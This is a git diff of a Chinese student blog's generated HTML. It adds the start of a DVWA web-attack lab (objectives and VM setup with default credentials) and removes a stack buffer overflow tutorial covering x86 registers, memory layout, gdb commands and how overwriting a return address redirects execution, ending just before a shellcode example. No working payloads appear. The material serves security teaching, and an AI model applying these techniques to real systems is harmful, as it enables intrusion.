@@ -88,10 +88,6 @@
 				
 			
 				
-					<a q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友链</a>
-				
-			
-				
 					<a q-on="click: openSlider(e, 'aboutme')" href="javascript:void(0)">关于我</a>
 				
 			
@@ -100,38 +96,16 @@
 			<div class="social">
 				
 					
-						<a class="github" href="#" 
-												title="GitHub" target="_blank"><i class="icon-github"></i></a>
+						<a class="cnblog" href="https://www.cnblogs.com/bushilushan/" 
+												title="cnblog" target="_blank"><i class="icon-cnblog"></i></a>
 					
 				
 					
-						<a class="github" href="#" 
-												title="GitHub" target="_blank"><i class="icon-github"></i></a>
-					
-				
-					
-						<a class="gitee" href="#" 
-												title="gitee" target="_blank"><i class="icon-gitee"></i></a>
-					
-				
-					
-						<a class="jianshu" href="#" 
-												title="jianshu" target="_blank"><i class="icon-jianshu"></i></a>
+						<a class="mail" href="mailto:2870545952@qq.com" 
+												title="Email" target="_blank"><i class="icon-mail"></i></a>
 					
 				
 			</div>
-		
-			
-			
-			
-			
-			<div>
-				<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="240" height="86" src="//music.163.com/outchain/player?type=2&id=1334445174&auto=0&height=66"></iframe>
-			</div>
-			
-				
-				<p style="font-size: 12px;">这似乎是首纯音乐，请尽情的欣赏它吧！<p>
-			
 		
 		</nav>
 	</header>		
@@ -177,23 +151,13 @@
 				<div class="social">
 					
 						
-						<a class="github" target="_blank" 
-							href="#" title="GitHub"><i class="icon-github"></i></a>
+						<a class="cnblog" target="_blank" 
+							href="https://www.cnblogs.com/bushilushan/" title="cnblog"><i class="icon-cnblog"></i></a>
 						
 					
 						
-						<a class="github" target="_blank" 
-							href="#" title="GitHub"><i class="icon-github"></i></a>
-						
-					
-						
-						<a class="gitee" target="_blank" 
-							href="#" title="gitee"><i class="icon-gitee"></i></a>
-						
-					
-						
-						<a class="jianshu" target="_blank" 
-							href="#" title="jianshu"><i class="icon-jianshu"></i></a>
+						<a class="mail" target="_blank" 
+							href="mailto:2870545952@qq.com" title="Email"><i class="icon-mail"></i></a>
 						
 					
 				</div>
@@ -232,7 +196,7 @@
   
     <h1 itemprop="name">
 	
-	  <a class="article-title" href="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/" target="_blank">web应用安全</a>
+	  <a class="article-title" href="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/" target="_blank">web安全实验</a>
   
     </h1>
   
@@ -253,7 +217,22 @@
   
   <div class="article-entry" itemprop="articleBody">
     
+      <!-- Table of Contents -->
     
+    <h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><ol>
+<li>理解web应用工作原理</li>
+<li>理解常见web漏洞原理，包括：XSS 跨站脚本、CSRF 跨站请求、命令注入、 SQL 注入等</li>
+<li>掌握常用的渗透测试工具，如：OWASP ZAP(或者 Burp suite)、SQLMAP 等</li>
+<li>掌握命令注入、SQL 注入、XSS、CSRF 等漏洞利用方式</li>
+</ol>
+<h2 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h2><ol>
+<li>配置 Web 攻防实验环境</li>
+<li>针对靶机 DVWA，进行命令注入、SQL 注入、XSS、CSRF 攻击，安全级别主要包括 low level 和 medium level。</li>
+</ol>
+<h2 id="三、实验原理"><a href="#三、实验原理" class="headerlink" title="三、实验原理"></a>三、实验原理</h2><h2 id="四、实验过程"><a href="#四、实验过程" class="headerlink" title="四、实验过程"></a>四、实验过程</h2><h3 id="4-1-环境搭建"><a href="#4-1-环境搭建" class="headerlink" title="4.1 环境搭建"></a>4.1 环境搭建</h3><p>​		下载 OWASPBWA 虚拟机镜像，导入 vmware。 网址：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/owaspbwa/files/latest/download">https://sourceforge.net/projects/owaspbwa/files/latest/download</a>.</p>
+<p>​		靶机的网络设置请避免使用桥架模式。 如果从宿主机进行靶机渗透，则需要确保宿主机和靶机的网络连接正确。也可以从另一台虚拟机发起渗透测试，同时也需要事先确保网络配置正确。</p>
+<p>​		通过浏览器访问靶机的 IP 地址，然后从页面选择 DVWA，进入 DVWA 应用。也可以直接访问 URL：<a target="_blank" rel="noopener" href="http://192.168.44.131/dvwa/login.php%E3%80%82%E6%B3%A8%E6%84%8F%E6%9B%BF%E6%8D%A2%E4%B8%BA%E4%B8%AA%E4%BA%BA%E7%8E%AF%E5%A2%83%E7%9A%84">http://192.168.44.131/dvwa/login.php。注意替换为个人环境的</a> IP 地 址。登录到 DVWA，用户名：admin；口令：admin。</p>
+<h3 id="4-2-命令注入攻击"><a href="#4-2-命令注入攻击" class="headerlink" title="4.2 命令注入攻击"></a>4.2 命令注入攻击</h3>
     
 
     
@@ -270,6 +249,10 @@
 			 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">网络安全</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">web安全</a>
         		</li>
       		
 		</ul>
@@ -349,294 +332,9 @@
 <li>通过栈缓冲区溢出进行提权</li>
 <li>提升难度的栈缓冲区溢出提权</li>
 </ol>
-<h2 id="三、实验原理"><a href="#三、实验原理" class="headerlink" title="三、实验原理"></a>三、实验原理</h2><h3 id="3-1-X86汇编基础"><a href="#3-1-X86汇编基础" class="headerlink" title="3.1 X86汇编基础"></a>3.1 X86汇编基础</h3><h4 id="3-1-1-冯诺依曼体系结构"><a href="#3-1-1-冯诺依曼体系结构" class="headerlink" title="3.1.1 冯诺依曼体系结构"></a>3.1.1 冯诺依曼体系结构</h4><p><img src="/2022/12/06/BOF/image-20221206161237891.png" alt="image-20221206161237891" style="zoom: 33%;">、、</p>
-<h4 id="3-1-2-X86汇编指令"><a href="#3-1-2-X86汇编指令" class="headerlink" title="3.1.2 X86汇编指令"></a>3.1.2 X86汇编指令</h4><p>X86汇编语法有Intel和AT&amp;T两种，我们以Intel语法为例进行说明。</p>
-<p>X86汇编语言中，一条指令由一个助记符，0个或多个操作数构成。助记符遇到时再说之后再讲，操作数主要有：</p>
-<ul>
-<li>立即数：操作数就是一个特定的值，例如0x24。</li>
-<li>寄存器：操作数是寄存器中存放的数值，例如EAX。</li>
-<li>内存地址：操作数是该内存地址所存放的数值，通常用“[]”括起来，”[]”内的值可以是内存地址、寄存器或计算公式等，例如：[EAX]，表示内存地址等于EAX寄存器中的值，操作数为该内存地址上的值。</li>
-</ul>
-<p><strong>寄存器</strong></p>
-<p>常用的X86寄存器可以分为4类：</p>
-<ul>
-<li>通用寄存器：用来存储数值或内存地址，在CPU执行期间使用。</li>
-<li>指令指针寄存器：存放下一条将要执行的指令的<strong>地址</strong>，不是下一条指令！</li>
-<li>段寄存器：用于定位内存段。</li>
-<li>状态标志寄存器：用于做出决定。</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>通用寄存器</th>
-<th>段寄存器</th>
-<th>状态寄存器</th>
-<th>指令指针寄存器</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>EAX（累加器）</td>
-<td>CS（代码段）</td>
-<td>EFLAGS（PSW）</td>
-<td>EIP（又称为程序计数器）</td>
-</tr>
-<tr>
-<td>EBX（基址寄存器）</td>
-<td>DS（数据段）</td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>ECX（计数寄存器）</td>
-<td>SS（堆栈段）</td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>EDX（数据寄存器）</td>
-<td>ES（扩展段）</td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>EBP（存放栈底地址）</td>
-<td>FS</td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>ESP（存放栈顶地址）</td>
-<td>GS</td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>ESI（源变址寄存器）</td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>EDI（目的变址寄存器）</td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-<h3 id="3-2-进程的内存空间布局"><a href="#3-2-进程的内存空间布局" class="headerlink" title="3.2 进程的内存空间布局"></a>3.2 进程的内存空间布局</h3><h4 id="3-2-1-从C程序到进程"><a href="#3-2-1-从C程序到进程" class="headerlink" title="3.2.1 从C程序到进程"></a>3.2.1 从C程序到进程</h4><ul>
-<li>编译（Compiler）：把C代码转换为汇编代码。</li>
-<li>汇编（Assembler）：把汇编代码转换为机器码</li>
-<li>连接（Linker）：处理依赖和库函数。</li>
-<li>加载（Loader）：设置内存空间并运行机器码。</li>
-</ul>
-<h4 id="3-2-2-Linux操作系统进程内存布局"><a href="#3-2-2-Linux操作系统进程内存布局" class="headerlink" title="3.2.2 Linux操作系统进程内存布局"></a>3.2.2 Linux操作系统进程内存布局</h4><p>​		运行时，loader请求OS给程序分配一个内存空间，32位系统，内存空间的地址范围时0——2^32-1，同理，63位系统的内存地址范围是0——2^64-1；每个地址对应的是一个字节的内存大小。</p>
-<p>​		每个进程都有自己的内存空间，称为虚地址空间，OS通过页表机制将进程的虚地址空间映射到真实的物理地址；<strong>虚地址空间</strong>又划分为内核空间（kernal space）和用户空间（user space），内核空间程序不能直接读写，这部分用于处理中断、系统调用等功能。</p>
-<p><strong>注意：内存的读写永远是从低地址开始的</strong></p>
-<p><img src="/2022/12/06/BOF/image-20221206191856886.png" alt="image-20221206191856886" style="zoom: 50%;">、</p>
-<p>​		注意，上图是针对Linux操作系统的进程内存分布，<strong>不懂操作系统、不同CPU或者不同编译器进程的内存分布都有可能是不一样的。</strong></p>
-<p>​		在上图的进程虚拟地址空间示意图中，在内核空间之下是<strong>栈</strong>（stack）区，用于存放局部变量和函数参数，如上图所示，<strong>为什么栈是从高地址向低地址分配内存的呢？栈中数据读写顺序又是什么样的呢？</strong></p>
-<p>​		针对第一个问题：如果栈向上涨的话，我们就必须得指定栈和堆的一个严格分界线，但这个分界线怎么确定呢？平均分？但是有的程序使用的堆空间比较多，而有的程序使用的栈空间比较多。所以就可能出现这种情况：一个程序因为栈溢出而崩溃的时候，其实它还有大量闲置的堆空间呢，但是我们却无法使用这些闲置的堆空间。所以呢，最好的办法就是让堆和栈一个向上涨，一个向下涨，这样它们就可以最大程度地共用这块剩余的地址空间，达到利用率的最大化！！</p>
-<p>​		针对第二个问题：为了进一步理解，可以看下面的一个例子：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="type">int</span> d;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a:%p,b:%p,d:%p\n&quot;</span>,&amp;a,&amp;b,&amp;d);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> a=<span class="number">0</span>,b=<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;real a:%p,b:%p\n&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">	func(a,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>那我们来看看Linux下该程序的打印结果，如下：</p>
-<p><img src="/2022/12/06/BOF/20210323132020856.png" alt="在这里插入图片描述">、</p>
-<p>​		从上述结果中可以看出，同一个函数里的变量还是从小地址往大地址增长，而嵌套的函数里的地址确实比外部函数的地址小，说明如果以函数为整体来看的话那么栈在Linux下确实时从高地址往低地址来分配的。</p>
-<p>​		而事实也确实是这样的：</p>
-<p>​		这个上下文里说的“栈”是函数调用栈，是以“栈帧”(stack frame)为单位的。每一次函数调用会在栈上分配一个新的栈帧，在这次函数调用结束时释放其空间。被调用函数(callee)的栈帧相对调用函数(caller）的栈帧的位置反映了栈的增长方向:如果被用函数的栈帧比调用函数的在更低的地址，那么栈就是向下增长;反之则是向上增长。<br>​		而在一个栈帧内，局部变量是如何分布到栈帧里的（所谓栈帧布局，stack frame layout)，这全是编译器的自由。</p>
-<p>​		在Windows下栈与堆的增长方向甚至是没有定义的。</p>
-<p>​		<strong>SS、EBP、ESP三者之间的关系：</strong></p>
-<p>​		段寄存器SS指向<strong>堆栈的真实内存段地址，ESP是用来指向该堆栈的栈顶，把它们合在一起可访问栈顶单元</strong>。 另外，当偏移量用到了指针寄存器EBP，则其缺省的段寄存器也是SS，并且用BP可访问整个堆栈 ，不仅仅是只访问栈顶。</p>
-<p>​		在栈的下面是**内存映射段 **（memory mapping segment），内核把文件内容直接映射到这里。当在linux系统调用mmap()，或者windows系统调用 CreateFileMapping()&#x2F;MapViewOfFile()时，就是请求内存映射。内存映射是一种高性能的文件I&#x2F;O方式， 比如用于加载动态链接库。也可以用于与任何文 件均无关的（没有对应文件的）匿名内存映射， 比如程序数据。在linux上，如果你用malloc()来请 求一大块的内存，则会创建匿名内存映射而不是使用堆区 。 这里的大块内存是指大于 MMAP_THRESHOLD字节，缺省情况下是128字节， 可以通过mallopt()函数进行调节。</p>
-<p>​		<strong>堆区</strong>提供运行时的内存分配，也就是动态内存分配。与栈区的内存分配不同，堆区分配的内存在函数返回时如果没有释放的话，还是有效的；而栈区的数据在对应的函数返回后，则无效。对于C语言而言，通过调用malloc()函数及其它对应的变体（calloc(), realloc()）来进行堆区存储分配。 因为堆区是动态分配及释放，因此可能造成堆区是碎片化，也就是不连续。</p>
-<p>​		<strong>BSS</strong>存放<strong>未初始化</strong>的<strong>全局变量或者静态变量</strong>， 也就是在源代码中未被程序员赋值的变量。比 如：static int cntActiveUsers； 则该变量的分配在BSS。</p>
-<p>​		而初始化的全局变量或者静态变量则存放在 <strong>Data</strong>区，如：static int cntWorkerBees&#x3D;10。</p>
-<p>​		<strong>代码段</strong>（code segment&#x2F;text segment）通常是指用来存放程序执行代码的一块内存区域。</p>
-<pre><code>### 3.3 gdb程序调试
-</code></pre>
-<p>​		在这一节中将介绍以下gdb调试的常用命令。</p>
-<h4 id="3-3-1-启动和退出gdb"><a href="#3-3-1-启动和退出gdb" class="headerlink" title="3.3.1 启动和退出gdb"></a>3.3.1 启动和退出gdb</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">调试可执行文件</span></span><br><span class="line">gdb 可执行文件 &lt;==&gt; gdb &amp;&amp; file 可执行文件</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">调试进程</span></span><br><span class="line">gdb -p pid</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">退出gdb</span></span><br><span class="line">quit or q</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-3-2-list查看源代码"><a href="#3-3-2-list查看源代码" class="headerlink" title="3.3.2 list查看源代码"></a>3.3.2 list查看源代码</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">列出指定行号附近的源代码</span></span><br><span class="line">list line_number</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">列出特定范围行的源代码</span></span><br><span class="line">list start_line_number,end_line_number</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">列出指定函数的代码</span></span><br><span class="line">list function_name</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-3-3-info查看信息"><a href="#3-3-3-info查看信息" class="headerlink" title="3.3.3 info查看信息"></a>3.3.3 info查看信息</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示全部寄存器及内容</span></span><br><span class="line">info all-register</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示指定寄存器的值</span></span><br><span class="line">i r ebp esp</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示断点信息</span></span><br><span class="line">info b</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示当前栈的所有局部变量</span></span><br><span class="line">info locals</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示当前函数的参数名以及对应值</span></span><br><span class="line">info args</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-3-4-break-x2F-b设置断点"><a href="#3-3-4-break-x2F-b设置断点" class="headerlink" title="3.3.4 break&#x2F;b设置断点"></a>3.3.4 break&#x2F;b设置断点</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在某个函数处设置断点</span></span><br><span class="line">b function_name</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在指定行设置断点</span></span><br><span class="line">b line_number</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在指定地址设置断点</span></span><br><span class="line">b *address</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除全部断点</span></span><br><span class="line">delete</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除断点N</span></span><br><span class="line">delete N</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除行N上的所有断点</span></span><br><span class="line">clear N</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-3-5-命令行参数"><a href="#3-3-5-命令行参数" class="headerlink" title="3.3.5 命令行参数"></a>3.3.5 命令行参数</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">每次运行都需要给出后面的参数</span></span><br><span class="line">r arg1 arg2 arg3</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置命令行参数</span></span><br><span class="line">set args AAA BBB CCC # 相当于argv[1]=“AAA”, argv[2]=“BBB”…</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示命令行参数设置</span></span><br><span class="line">show args</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-3-6-设置反汇编格式"><a href="#3-3-6-设置反汇编格式" class="headerlink" title="3.3.6 设置反汇编格式"></a>3.3.6 设置反汇编格式</h4><p>汇编：将汇编语言转换为机器码</p>
-<p>反汇编：将机器码转化为汇编语言</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">gdb默认的反汇编格式是ATT</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置反汇编格式为intel或att</span></span><br><span class="line">set disassembly-flavor intel/att</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-3-7-disas反汇编"><a href="#3-3-7-disas反汇编" class="headerlink" title="3.3.7 disas反汇编"></a>3.3.7 disas反汇编</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">反汇编函数</span></span><br><span class="line">disas function_name</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">带有源码的反汇编</span></span><br><span class="line">disas/m function_name</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">指定要反汇编的地址。请注意，当仅指定一个地址时，此命令将反汇编包含给定地址的整个函数，包括其上方的指令。</span></span><br><span class="line">disassemble [Address]</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">指定要反汇编的起始地址和结束地址。如果使用这种形式，该命令将不会反汇编整个函数，而只会反汇编起始地址和结束地址之间的指令。例如：</span></span><br><span class="line">disassemble [Start],[End]</span><br><span class="line">(gdb) disassemble 0x000000000040068a,0x00000000004006ac</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">指定从给定地址或函数开始反汇编的字节数，例如：</span></span><br><span class="line">disassemble [Function],+[Length]</span><br><span class="line">disassemble [Address],+[Length]</span><br><span class="line">disassemble main, +10</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/12/06/BOF/image-20221206202037493.png" alt="image-20221206202037493" style="zoom: 33%;">、</p>
-<h4 id="3-3-8-查看内存"><a href="#3-3-8-查看内存" class="headerlink" title="3.3.8 查看内存"></a>3.3.8 查看内存</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/&lt;n/f/u&gt; &lt;addr&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>n、f、u是可选的参数，addr表示一个内存地址 </li>
-<li>n 是一个正整数，表示需要显示的内存单元的个数，即从当前地址向后显示n个内存单元的内容，一个内存单元的大小由第三个参数u定义 </li>
-<li>f 表示显示的格式 ：x 按十六进制格式显示值 ，d 按十进制格式显示值 ，u 按无符号十进制显示值 ，o 按八进制格式显示变量 ，t 按二进制格式显示值 ，a 按地址格式显示值 ，c 按字符格式显示值 ，f 按浮点数格式显示值 ，s 以字符串形式显示值 ，i 以指令形式显示值。</li>
-<li>u 表示将多少个字节作为一个值取出来，如果不指定的话，GDB默认是4 个字节。当我们指定了字节长度后，GDB会从指定的内存地址开始，读取指定字节，并把其当作一个值取出来。b 表示单字节（byte），h 表示双字节（halfword），w 表示四字节（word） ，g 表示八字节（giant word）。</li>
-</ul>
-<p><img src="/2022/12/06/BOF/image-20221206202746805.png" alt="image-20221206202746805" style="zoom: 33%;">、</p>
-<h4 id="3-3-9修改寄存器或内存中的值"><a href="#3-3-9修改寄存器或内存中的值" class="headerlink" title="3.3.9修改寄存器或内存中的值"></a>3.3.9修改寄存器或内存中的值</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set $esp = 0x080484ee</span><br><span class="line">set 0x080484ee = 0x90909090</span><br></pre></td></tr></table></figure>
-
-<p>​	</p>
-<h3 id="示例程序源代码"><a href="#示例程序源代码" class="headerlink" title="示例程序源代码"></a>示例程序源代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> result = a + b;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> answer;</span><br><span class="line">    answer = add(<span class="number">40</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>、<img src="/2022/12/06/BOF/image-20221206204027448.png" alt="image-20221206204027448" style="zoom:50%;"></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">disas add #将内存中代码段的二进制机器码反汇编成了汇编语言</span><br><span class="line">push ebp #ebp的值一般都是上一个函数的栈底地址，例如add函数中在执行第一条push ebp时，ebp的值是main的栈底地址</span><br><span class="line">mov ebp,esp #此时的栈顶寄存器的值正好作为add函数的栈底</span><br><span class="line">sub esp,0x4 #栈顶指针向下一段空间，为局部变量和函数参数留出空间</span><br><span class="line"></span><br><span class="line">leave #leave &lt;==&gt; mov esp,ebp ; pop ebp</span><br><span class="line">ret # ret &lt;==&gt; pop eip</span><br></pre></td></tr></table></figure>
-
-<p>具体过程如下：</p>
-<p>、<img src="/2022/12/06/BOF/image-20221207191313551.png" alt="image-20221207191313551" style="zoom:33%;"></p>
-<p><strong>注意：call指令会先将返回地址，也就是RIP放在栈之上，然后才是栈</strong></p>
-<p>、<img src="/2022/12/06/BOF/image-20221207191324795.png" alt="image-20221207191324795" style="zoom:33%;"></p>
-<p>、<img src="/2022/12/06/BOF/image-20221207191336091.png" alt="image-20221207191336091" style="zoom:33%;"></p>
-<p>、<img src="/2022/12/06/BOF/image-20221207191348083.png" alt="image-20221207191348083" style="zoom:33%;"></p>
-<p>、<img src="/2022/12/06/BOF/image-20221207191356727.png" alt="image-20221207191356727" style="zoom:33%;"></p>
-<p>、<img src="/2022/12/06/BOF/image-20221207191456156.png" alt="image-20221207191456156" style="zoom:33%;"></p>
-<p>、<img src="/2022/12/06/BOF/image-20221207191514646.png" alt="image-20221207191514646" style="zoom:33%;"></p>
-<p>、<img src="/2022/12/06/BOF/image-20221207191534630.png" alt="image-20221207191534630" style="zoom:33%;"></p>
-<p><img src="/2022/12/06/BOF/image-20221207191544786.png" alt="image-20221207191544786" style="zoom:33%;">、</p>
-<p>、<img src="/2022/12/06/BOF/image-20221207191554270.png" alt="image-20221207191554270" style="zoom:33%;">、</p>
-<p><img src="/2022/12/06/BOF/image-20221207191619918.png" alt="image-20221207191619918" style="zoom:33%;">、</p>
-<p><img src="/2022/12/06/BOF/image-20221207191630206.png" alt="image-20221207191630206" style="zoom:33%;">、</p>
-<p><img src="/2022/12/06/BOF/image-20221207191639221.png" alt="image-20221207191639221" style="zoom:33%;">、</p>
-<p>、<img src="/2022/12/06/BOF/image-20221207191651952.png" alt="image-20221207191651952" style="zoom:33%;">、</p>
-<p><img src="/2022/12/06/BOF/image-20221207191702164.png" alt="image-20221207191702164" style="zoom:33%;">、</p>
-<p><img src="/2022/12/06/BOF/image-20221207191718067.png" alt="image-20221207191718067" style="zoom:33%;">、</p>
-<p><img src="/2022/12/06/BOF/image-20221207191728503.png" alt="image-20221207191728503" style="zoom:33%;">、</p>
-<p><img src="/2022/12/06/BOF/image-20221207191740088.png" alt="image-20221207191740088" style="zoom:33%;">、</p>
-<h3 id="3-4-栈缓冲区溢出"><a href="#3-4-栈缓冲区溢出" class="headerlink" title="3.4 栈缓冲区溢出"></a>3.4 栈缓冲区溢出</h3><p>首先区分<strong>缓冲区溢出</strong>和<strong>栈溢出</strong>，栈溢出只是缓冲区溢出的一种，是一种常见的缓冲区溢出攻击方式，我们这里也只讲栈溢出攻击。</p>
-<p>攻击者可以通过栈溢溢出哪些值？</p>
-<ul>
-<li>局部变脸</li>
-<li>函数参数</li>
-<li>保存的栈帧指针</li>
-<li>返回地址（RIP）</li>
-</ul>
-<p>当执行一个函数时，首先会先将这个函数的地址压栈，然后再将函数参数或者局部变量压栈，当一个函数返回时，EIP被设置为RIP，如果我们能溢出RIP，就可以将恶意程序布置在RIP处，就能实现攻击了。</p>
-<p>我们看如下一个攻击案例：</p>
-<img src="/2022/12/06/BOF/image-20221207160751646.png" alt="image-20221207160751646" style="zoom: 50%;">
-
-<img src="/2022/12/06/BOF/image-20221207161123918.png" alt="image-20221207161123918" style="zoom:50%;">
-
-<p>执行ret后，相当于pop eip，那么ESP的值就赋给了EIP，于是开始执行0x40cdffbf<strong>地址处的指令。</strong></p>
-<p><strong>关于shellcode和payload</strong></p>
-<ul>
-<li><p>exploit，渗透攻击，是指由攻击者或渗透测试者利用一个系统、应用或服务中的安全漏洞，所进行的攻击行为。</p>
-</li>
-<li><p>Payload，中文“有效载荷”，指成功 exploit 之后，在目标系统执行的代码或指令。</p>
-</li>
-<li><p>Shellcode，简单翻译“shell 代码”，是 Payload 的一种，由于其建立正向&#x2F;反向 shell 而得名。</p>
-</li>
-<li><p>漏洞程序运行payload，通常会生成一个供攻击者操作目标系统的 shell。</p>
-</li>
-<li><p>Shellcode也可以是其它功能代码，比如删除文件。</p>
-</li>
-<li><p>Shellcode是机器码，与OS和CPU紧密相关，采用汇编语言编写，即以asm为后缀。</p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes/">https://www.exploit-db.com/shellcodes/</a> 有大量现成shellcode。</p>
-</li>
-</ul>
-<p>shellcode示例：</p>
